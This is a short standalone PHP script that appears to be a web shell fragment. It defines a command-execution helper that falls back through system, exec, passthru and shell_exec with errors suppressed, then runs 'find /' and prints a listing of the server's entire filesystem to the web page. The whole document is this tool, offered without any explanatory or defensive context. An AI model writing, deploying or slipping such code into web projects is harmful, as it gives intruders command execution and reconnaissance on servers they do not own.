<?php
set_time_limit(0);
error_reporting(0);
function exect($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$exect = ""; 		
		foreach($results as $result) { 			
			$exect .= $result; 		
		} return $exect; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('shell_exec')) { 		
		$exect = @shell_exec($cmd); 		
		return $exect; 	
	} 
}
echo "<pre>";
echo exect("find /");
echo "</pre>";
?>
